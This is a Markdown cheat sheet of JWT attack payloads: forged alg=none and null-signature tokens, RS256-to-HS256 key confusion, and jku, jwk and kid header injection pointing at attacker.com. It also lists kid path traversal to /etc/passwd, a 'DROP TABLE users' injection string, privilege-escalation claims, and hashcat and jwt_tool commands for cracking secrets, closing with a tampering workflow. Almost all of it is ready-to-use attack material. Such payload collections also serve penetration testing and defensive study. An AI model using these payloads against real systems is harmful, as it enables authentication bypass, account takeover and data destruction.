# JWT Attack Payloads

## Algorithm Manipulation

### None Algorithm (CVE-2015-9235)
```
# Change alg to "none"
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

# None algorithm variants
none
None
NONE
nOnE
```

### RS256 to HS256 Key Confusion (CVE-2016-5431)
```
# Change alg to HS256, use server's public RSA key as HMAC secret
# Extract public key:
openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout

# Sign payload with RS256 → HS256
```

### Null Signature Attack (CVE-2020-28042)
```
# Remove signature entirely from HS256 token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSiOiJKb2huIERvZSIsImlhdCI6MTUxNjIzOTAyMn0.
```

## Header Injection (jwk, jku, kid)

### jku Header Injection
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "typ": "JWT"
}
```

### jwk Header Injection
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "e": "AQAB",
    "n": "..."
  }
}
```

### kid Path Traversal
```
"kid": "../../dev/null"
"kid": "/proc/sys/kernel/randomize_va_space"
"kid": "file:///etc/passwd"
```

### kid SQL/Command Injection
```
"kid": "admin'--"
"kid": "1; DROP TABLE users;--"
```

## Claim Manipulation

### Privilege Escalation
```json
{"sub": "123", "role": "admin"}
{"sub": "123", "is_admin": true}
{"sub": "123", "permissions": ["admin", "write", "delete"]}
```

### Expiration Manipulation
```json
{"exp": 9999999999}
{"nbf": 0}
{"iat": 9999999999}
```

### Issuer/ Audience Manipulation
```json
{"iss": "attacker", "aud": "target"}
{"iss": "target", "aud": "attacker"}
```

## JWT kid Claims Misuse

### File-based kid
```
"kid": "/root/res/keys/secret.key"
"kid": "../../etc/passwd"
```

### URL-based kid
```
"kid": "http://attacker.com/evil.key"
"kid": "https://attacker.com/jwks.json"
```

## Secret Brute Force

### Common secrets wordlist
```
secret
password
123456
your_jwt_secret
change_this_super_secret_random_string
```

### Tools
```bash
# jwt_tool
python3 jwt_tool.py <JWT> -d wordlist.txt -C

# hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i
```

## Token Fuzzing

### Inject claims
```bash
python3 jwt_tool.py <JWT> -I -pc claim -pv value
```

### Modify headers
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv custom_value
```

### Sign with key
```bash
python3 jwt_tool.py <JWT> -X s -pk public.pem
```

## Standard JWT Endpoints

```
/jwks.json
/.well-known/jwks.json
/openid/connect/jwks.json
/api/keys
/api/v1/keys
/{tenant}/oauth2/v1/certs
```

## JWT Crack Commands

```bash
# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Rule-based
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule

# Bruteforce (6-8 char)
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6

# jwt_tool
python3 -m pip install jwt_tool
python3 jwt_tool.py <JWT> -d /tmp/wordlist -C
```

## JWT Header Quick Reference

| Header | Purpose |
|--------|---------|
| alg | Algorithm (HS256, RS256, none) |
| typ | Type (JWT) |
| kid | Key ID |
| jku | JWKS URL |
| jwk | Embedded JSON Web Key |
| x5u | X.509 Certificate URL |
| x5c | X.509 Certificate Chain |

## JWT Manipulation Flow

1. **Identify**: Find JWT in Authorization header or cookies
2. **Decode**: Decode base64 to inspect header and payload
3. **Tamper**: Modify claims (role, sub, exp, etc.)
4. **Sign**: Use key confusion, none algorithm, or weak secret
5. **Test**: Send modified token and observe behavior